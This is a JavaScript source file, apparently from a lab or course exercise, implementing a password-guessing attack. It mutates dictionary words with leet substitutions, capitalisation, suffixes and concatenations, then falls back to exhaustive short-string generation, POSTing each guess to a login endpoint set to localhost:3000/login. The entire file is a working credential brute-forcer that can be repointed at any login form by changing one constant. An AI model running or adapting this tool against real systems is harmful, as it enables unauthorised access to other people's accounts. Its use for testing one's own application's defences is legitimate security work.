/*
Filename: crack2.js
Kurzbeschreibung:
  Wörterbuchbasierter Brute-Force-Angreifer mit Mutationen (Leet, Groß-/Kleinschreibung, Suffixe).
  Liest optional dictionary.txt und testet abgewandelte Passwortvarianten gegen den lokalen Login-Endpunkt.
  Enthält zusätzlich eine Fallback-Brute-Force-Funktion (Mono-Charset, kurze Länge) für den Notfall.
Aufrufparameter:
  node crack2.js <username>
Autor:
  Frederik, Kian
Datum:
  29.10.2025
*/

const fs = require('fs');
const path = require('path');
const fetch = global.fetch || require('node-fetch');
const TARGET_URL = 'http://localhost:3000/login';
const DICT_PATH = path.resolve(__dirname, 'dictionary.txt');
const MAX_TRIES = 20000000;
let found = false;

const pLimit = (concurrency) => {
    const queue = [];
    let active = 0;
    const next = () => {
        if (queue.length === 0) return;
        if (active >= concurrency) return;
        active++;
        const {fn, resolve} = queue.shift();
        fn().then((r) => {
            active--;
            resolve(r);
            next();
        }, (e) => {
            active--;
            resolve(Promise.reject(e));
            next();
        });
    };
    return (fn) => new Promise((resolve) => {
        queue.push({fn, resolve});
        next();
    });
};

const USERNAME = process.argv[2];
if (!USERNAME) {
    console.error('Usage: node attacker.js <username>');
    process.exit(1);
}

function safeMask(s) {
    if (!s) return '';
    return s.replace(/.(?=.{2})/g, '*');
}

const leetMap = {a: ['4', '@'], e: ['3'], i: ['1', '!'], o: ['0'], s: ['5', '$'], t: ['7']};

function leetVariants(word) {
    const res = new Set();
    function helper(idx, cur) {
        if (idx === word.length) {
            res.add(cur);
            return;
        }
        const ch = word[idx];
        helper(idx + 1, cur + ch);
        const low = ch.toLowerCase();
        if (leetMap[low]) {
            for (const sub of leetMap[low]) helper(idx + 1, cur + sub);
        }
    }
    helper(0, '');
    return Array.from(res);
}

function capsVariants(s) {
    return new Set([s, s.toLowerCase(), s.toUpperCase(), s[0].toUpperCase() + s.slice(1)]);
}

function buildBaseWords() {
    const words = new Set();
    if (fs.existsSync(DICT_PATH)) {
        const lines = fs.readFileSync(DICT_PATH, 'utf8').split(/\r?\n/).map(l => l.trim()).filter(Boolean);
        lines.forEach(w => words.add(w));
    }
    return Array.from(words);
}

function expandWithMutations(baseWords) {
    const out = new Set();
    const commonSuffixes = ['!', '1', '123', '2020', '2021', '2022', '#'];
    const specialInserts = ['!', '.', '_', '-', '@'];
    for (const w of baseWords) {
        for (const v of capsVariants(w)) {
            out.add(v);
            for (const s of commonSuffixes) out.add(v + s);
            for (const l of leetVariants(v)) out.add(l);
            out.add(v + '!');
            out.add('!' + v);
        }
        out.add(w + '123');
        out.add(w + '2023');
        for (const c of specialInserts) out.add(w + c);
    }
    const arr = Array.from(out);
    for (let i = 0; i < Math.min(200, arr.length); i++) {
        for (let j = 0; j < Math.min(200, arr.length); j++) {
            if (i === j) continue;
            out.add(arr[i] + arr[j]);
        }
    }
    return Array.from(out);
}

function* generateAndTest(charset, maxLen) {
    for (let len = 1; len <= maxLen; len++) {
        const indices = Array(len).fill(0);
        while (true) {
            yield indices.map(i => charset[i]).join('');
            let pos = len - 1;
            while (pos >= 0) {
                indices[pos]++;
                if (indices[pos] < charset.length) break;
                indices[pos] = 0;
                pos--;
            }
            if (pos < 0) break;
        }
    }
}

async function tryCandidate(candidate) {
    if (found) return false;
    const body = {username: USERNAME, password: candidate};
    try {
        const resp = await fetch(TARGET_URL, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(body)
        });
        if (resp.status === 200) {
            console.log(`FOUND password for ${USERNAME}: ${candidate}`);
            found = true;
            return true;
        } else {
            return false;
        }
    } catch (err) {
        console.error('Network error for candidate', safeMask(candidate), err.message);
        return false;
    }
}

(async () => {
    const base = buildBaseWords();
    console.log('Base words from files/personal:', base.slice(0, 20));
    let candidates = expandWithMutations(base);
    console.log(`Generated ${candidates.length} mutated candidates (capped).`);
    const common = ['password', '123456', 'qwerty', 'letmein', 'welcome'];
    candidates = candidates.concat(common);
    if (candidates.length > MAX_TRIES) candidates = candidates.slice(0, MAX_TRIES);
    const limit = pLimit();
    for (const c of candidates) {
        if (found) break;
        await limit(() => tryCandidate(c));
    }
    if (!found) {
        console.log('No match in dictionary/mutation phase.');
        const charset = '0123456789abcdefghijklmnopqrstuvwxyz'.split('');
        const gen = generateAndTest(charset, 3);
        let tries = 0;
        for (const candidate of gen) {
            if (found) break;
            tries++;
            if (tries % 1000 === 0) process.stdout.write(`Tried ${tries}\r`);
            await limit(() => tryCandidate(candidate));
        }
    }
    if (!found) console.log('Finished test run; password not found (within limits).');
})();